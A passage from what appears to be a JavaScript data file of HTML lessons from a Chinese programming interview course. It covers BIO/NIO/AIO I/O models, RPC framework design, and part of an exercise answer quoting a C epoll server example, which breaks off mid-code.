data-nodeid="43395">callBackFunction</code>去接收。从这个角度看，其实有两条时间线。第一条是程序的主干时间线，<code data-backticks="1" data-nodeid="43397">readKey</code>的执行到<code data-backticks="1" data-nodeid="43399">readKey</code>下文的程序都在这条主干时间线中。而<code data-backticks="1" data-nodeid="43401">callBackFunction</code>的执行会在用户按键时触发，也就是时间不确定，因此<code data-backticks="1" data-nodeid="43403">callBackFunction</code>中的程序是另一条时间线也是基于这种原因产生的，我们称作<strong data-nodeid="43411">异步</strong>，异步描述的就是这种时间线上无法同步的现象，你不知道<code data-backticks="1" data-nodeid="43409">callbackFunction</code>何时会执行。</p>\n<p data-nodeid="43307">但是我们通常说某某语言提供了异步 I/O，不仅仅是说提供上面程序这种写法，上面的写法会产生一个叫作<strong data-nodeid="43417">回调地狱</strong>的问题，本质是异步程序的时间线错乱，导致维护成本较高。</p>\n<pre class="lang-java" data-nodeid="43308"><code data-language="java">request(<span class="hljs-string">"/order/123"</span>, (data1) -&gt; {\n  <span class="hljs-comment">//..</span>\n  request(<span class="hljs-string">"/product/456"</span>, (data2) -&gt; {\n    <span class="hljs-comment">// ..</span>\n    request(<span class="hljs-string">"/sku/789"</span>, (data3) -&gt; {\n      <span class="hljs-comment">//...</span>\n    })\n  })\n})\n</code></pre>\n<p data-nodeid="43309">比如上面这段程序（称作回调地狱）维护成本较高，因此通常提供异步 API 编程模型时，我们会提供一种将异步转化为同步程序的语法。比如下面这段伪代码：</p>\n<pre class="lang-java" data-nodeid="43310"><code data-language="java">Future future1 = request(<span class="hljs-string">"/order/123"</span>)\nFuture future2 = request(<span class="hljs-string">"/product/456"</span>)\nFuture future3 = request(<span class="hljs-string">"/sku/789"</span>)\n<span class="hljs-comment">// ...</span>\n<span class="hljs-comment">// ...</span>\norder = future1.get()\nproduct = future2.get()\nsku = future3.get()\n</code></pre>\n<p data-nodeid="43311">request 函数是一次网络调用，请求订单 ID=123 的订单数据。本身 request 函数不会阻塞，会马上执行完成，而网络调用是一次异步请求，调用不会在<code data-backticks="1" data-nodeid="43420">request("/order/123")</code>下一行结束，而是会在未来的某个时间结束。因此，我们用一个 Future 对象封装这个异步操作。<code data-backticks="1" data-nodeid="43422">future.get()</code>是一个阻塞操作，会阻塞直到网络调用返回。</p>\n<p data-nodeid="43312">在<code data-backticks="1" data-nodeid="43425">request</code>和<code data-backticks="1" data-nodeid="43427">future.get</code>之间，我们还可以进行很多别的操作，比如发送更多的请求。 像 Future 这样能够将异步操作再同步回主时间线的操作，我们称作<strong data-nodeid="43437">异步转同步</strong>，也叫作<strong data-nodeid="43438">异步编程</strong>。通常一门语言如果提供异步编程的能力，指的是提供异步转同步的能力，程序员更适应同步操作，同步程序更好维护。</p>\n<h3 data-nodeid="43313">数据的传输和转化成本</h3>\n<p data-nodeid="43314">上面我们从编程的模型上对 I/O 进行了思考，接下来我们从内部实现分析下 BIO、NIO 和 AIO。无论是哪种 I/O 模型，都要将数据从网卡拷贝到用户程序（接收），或者将数据从用户程序传输到网卡（发送）。另一方面，有的数据需要编码解码，比如 JSON 格式的数据。还有的数据需要压缩和解压。数据从网卡到内核再到用户程序是 2 次传输。注意，将数据从内存中的一个区域拷贝到另一个区域，这是一个 CPU 密集型操作。数据的拷贝归根结底要一个字节一个字节去做。</p>\n<p data-nodeid="43315">从网卡到内核空间的这步操作，可以用 DMA（Direct Memory Access）技术控制。DMA 是一种小型设备，用 DMA 拷贝数据可以不使用 CPU，从而节省计算资源。遗憾的是，通常我们写程序的时候，不能直接控制 DMA，因此 DMA 仅仅用于设备传输数据到内存中。不过，从内核到用户空间这次拷贝，可以用内存映射技术，将内核空间的数据映射到用户空间。</p>\n<blockquote data-nodeid="43316">\n<p data-nodeid="43317">本文关于 DMA 技术和多线程讨论较浅，对这两个技术感兴趣的同学可以看下我在拉勾教育平台推出的<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="43445">《重学操作系统》</a>专栏。</p>\n</blockquote>\n<p data-nodeid="43318">有同学会问：上面我们讨论的内容和 I/O 模型有什么关联吗？其实我是想告诉你，无论 I/O 的编程模型如何选择，数据传输和转化成本是逃不掉的。或者说不会因为选择某种模型，就减少数据传输、数据压缩解压、数据编码解码这方面的成本。但是通过 DMA 技术和内存映射技术，就可以节省这部分成本。之所以会特别强调这点，是因为网上很多的博文会把 DMA、内存映射技术和 BIO/AIO/NIO 等概念混为一谈。</p>\n<h3 data-nodeid="43319">数据结构运用</h3>\n<p data-nodeid="43320">在处理网络 I/O 问题的时候，还有一个重点问题要注意，就是数据结构的运用。</p>\n<h4 data-nodeid="43321">缓冲区</h4>\n<p data-nodeid="43322">缓冲区是一种在处理 I/O 问题中常用的数据结构，<strong data-nodeid="43460">一方面缓冲区起到缓冲作用</strong>，在瞬时 I/O 量较大的时候，利用排队机制进行处理。<strong data-nodeid="43461">另一方面，缓冲区起到一个批处理的作用</strong>，比如 1000 次 I/O 请求进入缓冲区，可以合并成 50 次 I/O 请求，那么整体性能就会上一个档次。</p>\n<p data-nodeid="43323">举个例子，比如你有 1000 个订单要写入 MySQL，如果这个时候你可以将这 1000 次请求合并成 50 次，那么磁盘写入次数将大大减少。同理，假设有 10000 次网络请求，如果可以合并发送，会减少 TCP 协议握手时间，可以最大程度地复用连接；另一方面，如果这些请求都较小，还可以粘包复用 TCP 段。在处理 Web 网站的时候，经常会碰到将多个 HTTP 请求合并成一个发送，从而减少整体网络开销的情况。</p>\n<p data-nodeid="43324"><strong data-nodeid="43467">除了上述两方面原因，缓冲区还可以减少实际对内存的诉求</strong>。数据在网卡到内核，内核到用户空间的过程中，建议都要使用缓冲区。当收到的某个请求较大的时候，抽象成流，然后使用缓冲区可以减少对内存的使用压力。这是因为使用了缓冲区和流，就不需要真的准备和请求数据大小一致的内存空间了。可以将缓冲区大小规模的数据分成多次处理完，实际的内存开销是缓冲区的大小。</p>\n<h4 data-nodeid="43325">I/O 多路复用模型</h4>\n<p data-nodeid="43326">在运用数据结构的时候，还要思考 I/O 的多路复用用什么模型。</p>\n<p data-nodeid="43327">假设你在处理一个高并发的网站，每秒有大量的请求打到你的服务器上，你用多少个线程去处理 I/O 呢？对于没有需要压缩解压的场景，处理 I/O 的主要开销还是数据的拷贝。那么一个 CPU 核心每秒可以完成多少次数据拷贝呢？</p>\n<p data-nodeid="43328">拷贝，其实就是将内存中的数据从一个地址拷贝到另一个地址。再加上有 DMA，内存映射等技术，拷贝是非常快的。不考虑 DMA 和内存映射，一个 3GHz 主频的 CPU 每秒可以拷贝的数据也是百兆级别的。当然，速度还受限于内存本身的速度。<strong data-nodeid="43476">因此总的来说，I/O 并不需要很大的计算资源</strong>。通常我们在处理高并发的时候，也不需要大量的线程去进行 I/O 处理。</p>\n<p data-nodeid="43329">对于多数应用来说，处理 I/O 的成本小于处理业务的成本。处理高并发的业务，可能需要大量的计算资源。每笔业务也可能会需要更多的 I/O，比如远程的 RPC 调用等。</p>\n<p data-nodeid="43330"><strong data-nodeid="43482">因此我们在处理高并发的时候，一种常见的 I/O 多路复用模式就是由少量的线程处理大量的网络接收、发送工作。然后再由更多的线程，通常是一个线程池处理具体的业务工作</strong>。在这样一个模式下，有一个核心问题需要解决，就是当操作系统内核监测到一次 I/O 操作发生，它如何具体地通知到哪个线程调用哪段程序呢？</p>\n<p data-nodeid="43331">这时，一种高效的模型会要求我们将线程、线程监听的事件类型，以及响应的程序注册到内核。具体来说，比如某个客户端发送消息到服务器的时候，我们需要尽快知道哪个线程关心这条消息（处理这个数据）。例如 epoll 就是这样的模型，内部是红黑树。我们可以具体地看到文件描述符构成了一棵红黑树，而红黑树的节点上挂着文件描述符对应的线程、线程监听事件类型以及相应程序。</p>\n<p data-nodeid="43332">最后，你可能会问：老师你讲了这么多，和 BIO、AIO、NIO 有什么关系？这里有两个联系。</p>\n<p data-nodeid="46039" class="te-preview-highlight"><strong data-nodeid="46048">首先是无论哪种编程模型都需要使用缓冲区，也就是说 BIO、AIO、NIO 都需要缓冲区</strong>，因此关系很大。在我们使用任何编程模型的时候，如果内部没有使用缓冲区，那么一定要在外部增加缓冲区。<strong data-nodeid="46049">另一个联系是类似 epoll 这种注册+消息推送的方式，可以帮助我们节省大量定位具体线程以及事件类型的时间</strong>。这是一个通用技巧，并不是独有某种 I/O 模型才可以使用。</p>\n\n\n\n\n<p data-nodeid="43334">不过从能力上分析，使用类似 epoll 这种模型，确实没有必要让处理 I/O 的线程阻塞，因为操作系统会将需要响应的事件源源不断地推送给处理的线程，因此可以考虑不让处理线程阻塞（比如用 NIO）。</p>\n<h3 data-nodeid="43335">总结</h3>\n<p data-nodeid="43336">这一讲我们从 3 个方面讨论了 I/O 模型。</p>\n<ul data-nodeid="43337">\n<li data-nodeid="43338">\n<p data-nodeid="43339"><strong data-nodeid="43508">第一个是编程模型</strong>，阻塞、非阻塞、异步 3 者 API 的设计会有比较大的差异。通常情况下我们说的异步编程是异步转同步。异步转同步最大的价值，就是提升代码的可读性。可读，就意味着维护成本的下降以及扩展性的提升。</p>\n</li>\n<li data-nodeid="43340">\n<p data-nodeid="43341">第二个在设计系统的 I/O 时，另一件<strong data-nodeid="43514">需要考虑的就是数据传输以及转化的成本</strong>。传输主要是拷贝，比如可以使用内存映射来减少数据的传输。但是这里要注意一点，内存映射使用的内存是内核空间的缓冲区，因此千万不要忘记回收。因为这一部分内存往往不在我们所使用的语言提供的内存回收机制的管控范围之内。</p>\n</li>\n<li data-nodeid="43342">\n<p data-nodeid="43343"><strong data-nodeid="43519">最后是关于数据结构的运用</strong>，针对不同的场景使用不同的缓冲区，以及选择不同的消息通知机制，也是处理高并发的一个核心问题。</p>\n</li>\n</ul>\n<p data-nodeid="43344">从上面几个角度去看 I/O 的模型，你会发现，编程模型是编程模型、数据的传输是数据的传输、消息的通知是消息的通知，它们是不同的模块，完全可以解耦，也可以根据自己不同的业务特性进行选择。虽然在一个完整的系统设计中，往往提出的是一套完整的解决方案（这也是很多网上的博文会将者 3 者混为一谈的原因），但实际上我们还是应该将它们分开去思考，这样可以产生更好的设计思路。</p>\n<p data-nodeid="43345"><strong data-nodeid="43525">那么现在你可以尝试来回答本讲关联的面试题目：BIO、NIO 和 AIO 有什么区别</strong>？</p>\n<p data-nodeid="43346">【<strong data-nodeid="43531">解析</strong>】总的来说，这三者是三个 I/O 的编程模型。BIO 接口设计会直接导致当前线程阻塞。NIO 的设计不会触发当前线程的阻塞。AIO 为 I/O 提供了异步能力，也就是将 I/O 的响应程序放到一个独立的时间线上去执行。但是通常 AIO 的提供者还会提供异步编程模型，就是实现一种对异步计算封装的数据结构，并且提供将异步计算同步回主线的能力。</p>\n<p data-nodeid="43347">通常情况下，这 3 种 API 都会伴随 I/O 多路复用。如果底层用红黑树管理注册的文件描述符和事件，可以在很小的开销内由内核将 I/O 消息发送给指定的线程。另外，还可以用 DMA，内存映射等方式优化 I/O。</p>\n<h3 data-nodeid="43348">思考题</h3>\n<p data-nodeid="43349">最后再给你出一道需要查资料的思考题：I/O 多路复用用协程和用线程的区别？</p>\n<p data-nodeid="43350">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲我们将学习《13 | 面试中如何回答“怎样实现 RPC 框架”的问题？》 ，再见！</p>',
        article_title: "12 | 网络 I/O 模型：BIO、NIO 和 AIO 有什么区别？",
        title: "12 | 网络 I/O 模型：BIO、NIO 和 AIO 有什么区别？",
        id: 7278,
      },
      {
        content:
          '<p data-nodeid="57629" class="">随着微服务架构的盛行，远程调用成了开发微服务必不可少的能力，RPC 框架作为微服务体系的底层支撑，也成了日常开发的必备工具。当下，RPC 框架已经不仅是进行远程调用的基础工具，还需要提供路由、服务发现、负载均衡、容错等能力。那么今天，我们就以“<strong data-nodeid="57692">怎样实现 RPC 框架</strong>”为引，从设计者角度看看如何设计一个 RPC 框架。</p>\n<h3 data-nodeid="57630" class="">基础能力设计</h3>\n<p data-nodeid="57631" class="">RPC（Remote Procedure Call）远程过程调用，顾名思义最基本的能力当然是远程调用一个过程。放到今天的面向对象的语言中，其实就是调用一个远程的方法。在远程我们必须先定义这个方法，然后才可以通过 RPC 框架调用该方法，远程调用不仅可以传参数、获取到返回值，还可以捕捉调用过程中的异常。RPC 让远程调用就像本地调用一样。</p>\n<p data-nodeid="57632" class="">假设我们实现了一个<code data-backticks="1" data-nodeid="57696">rpc</code>对象，其中的<code data-backticks="1" data-nodeid="57698">invoke</code>方法可以实现远程调用。下面这段伪代码在调用远程的<code data-backticks="1" data-nodeid="57700">greetings</code>方法（RPC 调用），并向远程方法传递参数<code data-backticks="1" data-nodeid="57702">arg1``arg2</code>，然后再接收到远程的返回值。</p>\n<pre class="lang-java" data-nodeid="57633"><code data-language="java"><span class="hljs-keyword">var</span> result = rpc.invoke(<span class="hljs-string">"greetings"</span>, arg1, arg2, ...)\n</code></pre>\n<p data-nodeid="58876">这段程序将本地看作 一个 RPC 的客户端，将远程看作一个 RPC 的服务端。如下图所示：</p>\n<p data-nodeid="58877" class=""><img src="https://s0.lgstatic.com/i/image6/M00/40/28/Cgp9HWCjgYmAH8UHAAFonM-fpzM453.png" alt="Drawing 1.png" data-nodeid="58881"></p>\n\n\n\n<p data-nodeid="57637" class="">服务 A 发起远程方法调用，RPC 客户端通过某种协议将请求发送给服务 B，服务 B 解析请求，进行本地方法的调用，将结果返回到服务 B 的 RPC 服务端，最终返回到服务 A。对服务 A 来说，调用的是一个函数，从接口到返回值的设计，和调用本地函数并没有太大的差别。当然，程序员不能完全忽略这是一次远程方法调用，因为远程调用的开销较大。如果程序员没有意识到调用远程方法有网络开销，就可能会写出下面这段程序：</p>\n<pre class="lang-java" data-nodeid="57638"><code data-language="java"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) {\n  rpc.invoke(...)\n}\n</code></pre>\n<p data-nodeid="57639" class="">之所以写出上面的程序，是因为你（程序员）没有意识到 rpc.invoke 是一次远程调用。在实际的操作过程中，<code data-backticks="1" data-nodeid="57713">rpc.invoke</code>可能被封装到了某个业务方法中，程序员调用的时候便容易忽视这是一次远程操作。所以 RPC 调用时就要求你（程序员）对性能有清晰的认识。</p>\n<h3 data-nodeid="57640">多路复用的优化</h3>\n<p data-nodeid="57641" class=""><strong data-nodeid="57724">RPC 提供的是远程方法的调用，但本质上是数据的传递，传递数据有一个最基本的问题要处理，就是提升吞吐量（单位时间传递的数据量）</strong>。如果为每个远程调用（请求）建立一个连接，就会造成资源的浪费，因此通常我们会考虑多个请求复用一个连接，叫作<strong data-nodeid="57725">多路复用</strong>。</p>\n<p data-nodeid="59566" class="">在具体实现多路复用的时候，也会有不同的策略。假设我们要发送数据 A、B、C、D，那么一种方式是建立一个连接，依次将 A、B、C、D 发过去，就像下图这样：</p>\n<p data-nodeid="59567" class=""><img src="https://s0.lgstatic.com/i/image6/M00/40/31/CioPOWCjgaOAUlOMAABy4il5v8s683.png" alt="Drawing 3.png" data-nodeid="59571"></p>\n\n\n\n<p data-nodeid="57645" class="">在这种结构中，利用一个连接顺序发送 A、B、C、D 将多个请求放入一个连接的方式，节省了多次握手、挥手的时间，但是由于 ABCD 不是真的并行发送，而是顺序发送，当其中某个请求的体积较大时，容易阻塞其他请求。比如下图这种情况：</p>\n<p data-nodeid="59914" class=""><img src="https://s0.lgstatic.com/i/image6/M00/40/28/Cgp9HWCjgb-AbjPcAAB4uqNKiqI048.png" alt="Drawing 5.png" data-nodeid="59917"></p>\n\n\n<p data-nodeid="57648" class="">在 A 较大的时候，B，C，D 就只能等 A 完全传送完成才能发生传送。这样的模型对于 RPC 请求／响应大小不平均的网络不太友好，体积小的请求／响应可能会因为一些大体积的请求／响应而延迟。</p>\n<p data-nodeid="60570">因此还有另一种常见的多路复用方案，就是将 Ａ、Ｂ、Ｃ、Ｄ 切片一起传输，如下图所示：</p>\n<p data-nodeid="60571" class="te-preview-highlight"><img src="https://s0.lgstatic.com/i/image6/M00/40/29/Cgp9HWCjgguARpfEAAENqpybwLU268.png" alt="Drawing 7.png" data-nodeid="60575"></p>\n\n\n\n<p data-nodeid="57652">上图中，我们用不同颜色代表不同的传输任务。采用顺序传输方案将 A、B、C、Ｄ 用一个连接传输节省了握手、挥手的成本。切片传输的方案在这之上，将数据切片可以保证大、小任务并行，不会因为大任务阻塞小任务。</p>\n<p data-nodeid="57653">另外还有一个需要考虑的点，是单个 TCP 连接的极限传输速度受到窗口大小、缓冲区等因素的制约，不一定可以用满网络资源。如果传输量特别大的时候，有可能需要考虑提供多个连接，每个连接再去考虑多路复用的情况。</p>\n<h3 data-nodeid="57654">调用约定和命名</h3>\n<p data-nodeid="57655">接下来，我们一起思考下服务的命名。<strong data-nodeid="57756">远程调用一个函数，命名空间＋类名＋方法名是一个比较好的选择，简而言之，每个可以远程调用的方法就是一个字符串</strong>。</p>\n<p data-nodeid="57656">比如远程调用一个支付服务对象 PayService 的 pay 方法，命名空间可能是 trade.payment，对象名称是 PayService，方法名称是 pay。组合起来可以是一个完整的字符串，例如用 # 分割：<code data-backticks="1" data-nodeid="57758">trade.payment#PayService#pay</code>。</p>\n<p data-nodeid="57657">在进行远程调用的时候，给远程方法命名是调用约定的一部分。我们通过调用命名空间下完整的名称调用远程方法。在面向对象的语言中，还有一种常见的做法是先不具体指定调用的方法，而是先创造一个远程对象的实例。比如上面例子中我们先通过 RPC 框架构造一个 PayService 对象的实例。这里会用到一些特别的编程技巧，比如代理设计模式、动态接口生成等。</p>\n<p data-nodeid="57658">不过归根结底，我们调用的本质就是字符串名称。而实现这个调用，你需要知道两件事情：</p>\n<ul data-nodeid="57659">\n<li data-nodeid="57660">\n<p data-nodeid="57661">IP 是多少，也就是方法在哪台机器上调用；</p>\n</li>\n<li data-nodeid="57662">\n<p data-nodeid="57663">端口是多少，也就是哪个服务提供这个调用。</p>\n</li>\n</ul>\n<h3 data-nodeid="57664">注册和发现</h3>\n<p data-nodeid="57665">调用的时候，我们需要根据字符串（命名）去获取 IP 和端口（机器和服务）。</p>\n<p data-nodeid="57666">机器可以是虚拟机、容器、实体机，也可以是某个拥有虚拟网卡的代理。在网络的世界中，需要的只是网络接口和 IP 地址。而操作系统区分应用需要的是端口。所以，在调用过程中，我们需要的是一个注册表，存储了字符串和 IP + 端口的对应关系。</p>\n<p data-nodeid="57667">聪明的同学可能马上会想到，用 Redis 的<code data-backticks="1" data-nodeid="57768">hash</code>对象存储这个对应关系就很不错。当我们上线一个服务的时候，就在 Redis 的某个<code data-backticks="1" data-nodeid="57770">hash</code>对象中存储它和它对应的 IP 地址 + 端口列表。为什么是存一个列表？因为一个服务可能由多个机器提供。</p>\n<p data-nodeid="57668">通常我们将写这个<code data-backticks="1" data-nodeid="57773">hash</code>对象的过程，也就是服务被记录的过程称作<strong data-nodeid="57783">注册</strong>。我们远程调用一个 RPC 服务的时候，调用端提供的是 RPC 服务的名称（例如：命名空间+对象+方法），根据名称查找到提供服务的 IP + 端口清单并指定某个 IP + 端口（提供服务）的过程称作<strong data-nodeid="57784">发现</strong>。</p>\n<p data-nodeid="57669">当然，我们不能就这样简单理解成：注册就是写一个共享的哈希表，发现就是查哈希表再决定服务的响应者。在实际的设计中，要考虑的因素会更多。</p>\n<p data-nodeid="57670">比如基于 Redis 的实现，如果所有 RPC 调用都需要去 Redis 查询，会造成负责发现的中间件压力较大。实际的操作过程中，往往会增加缓存。也就是 RPC 调用者会缓存上一次调用的 IP + 端口。但是这样设计，缓存又可能会和注册表之间产生数据不一致的问题。这个时候，可以考虑由分布式共识服务比如 ZooKeeper 提供订阅，让 RPC 调用者订阅到服务地址的变更，及时更新自己的缓存。</p>\n<p data-nodeid="57671"><strong data-nodeid="57791">设计注册和发现两个功能的最大的价值是让客户端不再需要关注服务的部署细节，这样方便在全局动态调整服务的部署策略</strong>。</p>\n<h4 data-nodeid="57672">负载均衡的设计</h4>\n<p data-nodeid="57673">在设计 RPC 框架的时候，负载均衡器的设计往往需要和 RPC 框架一起考虑。因为 RPC 框架提供了注册、发现的能力，提供发现能力的模块本身就是一个负载均衡器。因此负载均衡可以看作发现模块的一个子组件。请求到达 RPC 的网关（或某个路由程序）后，发现组件会提供服务对应的所有实例（IP + 端口），然后负载均衡算法会指定其中一个响应这个请求。</p>\n<h4 data-nodeid="57674">可用性和容灾</h4>\n<p data-nodeid="57675">当一个服务实例崩溃的时候（不可用），因为有发现模块的存在，可以及时从注册表中删除这个服务实例。只要服务本身有足够多的实例，比如多个容器而且部署在不同的机器上，那么完全不可能用的风险会大大降低。当然，可用性是不可能 100% 实现的。</p>\n<p data-nodeid="57676">另外，注册表和 RPC 调用者之间必然存在不一致现象，而且注册表的更新本身也可能滞后。比如确认一个服务有没有崩溃，可能需要一个心跳程序持续请求这个服务，因此 RPC 的调用者如果调用到一个不存在的服务，或者调用到一个发生崩溃的服务，需要自己重新去发现组件申请新的服务实例（地址 + 端口）。</p>\n<p data-nodeid="57677">如果遇到临时访问量剧增，需要扩容的场景。这个时候只需要上线更多的容器，并且去注册即可。当然这要求部署模块和注册模块之间有较高的协同，这块可以用自动化脚本衔接。</p>\n<h3 data-nodeid="57678">总结</h3>\n<p data-nodeid="57679">总结下，<strong data-nodeid="57804">设计一个 RPC 框架最基础的能力就是实现远程方法的调用</strong>。这里需要一个调用约定，比如怎么描述一个远程的方法，发送端怎么传递参数，接收方如何解析参数？如果发生异常应该如何处理？具体来说，这些事情都不难实现，只是比较烦琐。其实不仅仅在 RPC 调用时有调用约定，编译器在实现函数调用的时候，也会有调用约定。另外，还有一些在 RPC 基础上建立起来的更复杂、更体系化的约定，比如说面向服务架构（SOA）。</p>\n<p data-nodeid="57680">在实现了基本调用能力的基础上，接下来就是提供服务的注册、发现能力。有了这两个能力，就可以向客户端完全屏蔽服务的部署细节，并衍生出容灾、负载均衡的设计。</p>\n<p data-nodeid="57681">当然，程序员还需要思考底层具体网络的传输问题。如果用 TCP 要思考多路复用以及连接数量的问题；如果是 UDP，需要增加对于可靠性保证的思考。如果使用了消息队列，还需要考虑服务的幂等性设计等。</p>\n<h3 data-nodeid="57682">思考题</h3>\n<p data-nodeid="57683">最后，再给你出一道需要查资料的思考题目：如何理解 Dubbo 的几个组成部分 Consumer、Provider、Monitor 和 Registry？</p>\n<p data-nodeid="57684">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲是《模块三思考题解答》，希望你自己完成题目后再来看答案和分析。再见！</p>',
        article_title: "13 | 面试中如何回答“怎样实现 RPC 框架”的问题？",
        title: "13 | 面试中如何回答“怎样实现 RPC 框架”的问题？",
        id: 7279,
      },
      {
        content:
          '<p data-nodeid="2">今天我会带你把《<strong data-nodeid="58">模块三：网络编程</strong>》中涉及的课后练习题，逐一讲解，并给出每个课时练习题的解题思路和答案。</p>\n<h3 data-nodeid="3">练习题详解</h3>\n<h4 data-nodeid="4">10 | Socket 编程：epoll 为什么用红黑树？</h4>\n<p data-nodeid="5">【<strong data-nodeid="70">问题</strong>】<strong data-nodeid="71">请你找一个 epoll 的 hello world 例子，并尝试理解它</strong>。</p>\n<p data-nodeid="6">【<strong data-nodeid="77">解析</strong>】epoll 是一个 C 语言的 API，因此使用的时候需要一点 C 的基础。不过，即便没有，其实也不影响你读懂下面的程序。</p>\n<p data-nodeid="7">下面是是一段摘自“<a href="https://github.com/millken/c-example/blob/master/epoll-example.c?fileGuid=uCG9Y5F8xVkBmki5" data-nodeid="81">https://github.com/millken/c-example/blob/master/epoll-example.c</a>”的示例程序，该程序用 epoll 模式实现了一个服务，如下所示：</p>\n<pre class="lang-c++" data-nodeid="8"><code data-language="c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>\n<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>\n<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>\n<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>\n<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span>\n<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netdb.h&gt;</span></span>\n<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>\n<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>\n<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/epoll.h&gt;</span></span>\n<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span>\n<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXEVENTS 64</span>\n<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>\n<span class="hljs-title">make_socket_non_blocking</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> sfd)</span>\n</span>{\n<span class="hljs-keyword">int</span> flags, s;\nflags = fcntl (sfd, F_GETFL, <span class="hljs-number">0</span>);\n<span class="hljs-keyword">if</span> (flags == <span class="hljs-number">-1</span>)\n {\n   perror (<span class="hljs-string">"fcntl"</span>);\n   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;\n }\nflags |= O_NONBLOCK;\ns = fcntl (sfd, F_SETFL, flags);\n<span class="hljs-keyword">if</span> (s == <span class="hljs-number">-1</span>)\n {\n   perror (<span class="hljs-string">"fcntl"</span>);\n   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;\n }\n<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;\n}\n<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>\n<span class="hljs-title">create_and_bind</span> <span class="hljs-params">(<span class="hljs-keyword">char</span> *port)</span>\n</span>{\n<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> <span class="hljs-title">hints</span>;</span>\n<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> *<span class="hljs-title">result</span>, *<span class="hljs-title">rp</span>;</span>\n<span class="hljs-keyword">int</span> s, sfd;\n<span class="hljs-built_in">memset</span> (&amp;hints, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (struct addrinfo));\nhints.ai_family = AF_UNSPEC;     <span class="hljs-comment">/* Return IPv4 and IPv6 choices */</span>\nhints.ai_socktype = SOCK_STREAM; <span class="hljs-comment">/* We want a TCP socket */</span>\nhints.ai_flags = AI_PASSIVE;     <span class="hljs-comment">/* All interfaces */</span>\ns = getaddrinfo (<span class="hljs-literal">NULL</span>, port, &amp;hints, &amp;result);\n<span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)\n {\n   <span class="hljs-built_in">fprintf</span> (<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"getaddrinfo: %s\\n"</span>, gai_strerror (s));\n   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;\n }\n<span class="hljs-keyword">for</span> (rp = result; rp != <span class="hljs-literal">NULL</span>; rp = rp-&gt;ai_next)\n {\n   sfd = socket (rp-&gt;ai_family, rp-&gt;ai_socktype, rp-&gt;ai_protocol);\n   <span class="hljs-keyword">if</span> (sfd == <span class="hljs-number">-1</span>)\n     <span class="hljs-keyword">continue</span>;\n   s = bind (sfd, rp-&gt;ai_addr, rp-&gt;ai_addrlen);\n   <span class="hljs-keyword">if</span> (s == <span class="hljs-number">0</span>)\n     {\n       <span class="hljs-comment">/* We managed to bind successfully! */</span>\n       <span class="hljs-keyword">break</span>;\n     }\n   <span class="hljs-built_in">close</span> (sfd);\n }\n<span class="hljs-keyword">if</span> (rp == <span class="hljs-literal">NULL</span>)\n {\n   <span class="hljs-built_in">fprintf</span> (<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Could not bind\\n"</span>);\n   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;\n }\nfreeaddrinfo (result);\n<span class="hljs-keyword">return</span> sfd;\n}\n<span class="hljs-function"><span class="hljs-keyword">int</span>\n<span class="hljs-title">main</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span>\n</span>{\n<span class="hljs-keyword">int</span> sfd, s;\n<span class="hljs-keyword">int</span> efd;\n<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">event</span>;</span>\n<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> *<span class="hljs-title">events</span>;</span>\n<span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)\n {\n   <span class="hljs-built_in">fprintf</span> (<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Usage: %s [port]\\n"</span>, argv[<span class="hljs-number">0</span>]);\n   <span class="hljs-built_in">exit</span> (EXIT_FAILURE);\n }\nsfd = create_and_bind (argv[<span class="hljs-number">1</span>]);\n<span class="hljs-keyword">if</span> (sfd == <span class="hljs-number">-1</span>)\n <span class="hljs-built_in">abort</span> ();\ns = make_socket_non_blocking (sfd);\n<span class="hljs-keyword">if</span> (s == <span class="hljs-number">-1</span>)\n <span class="hljs-built_in">abort</span> ();\ns = <span class="hljs-built_in">listen</span> (sfd, SOMAXCONN);\n<span class="hljs-keyword">if</span> (s == <span class="hljs-number">-1</span>)\n {\n   perror (<span 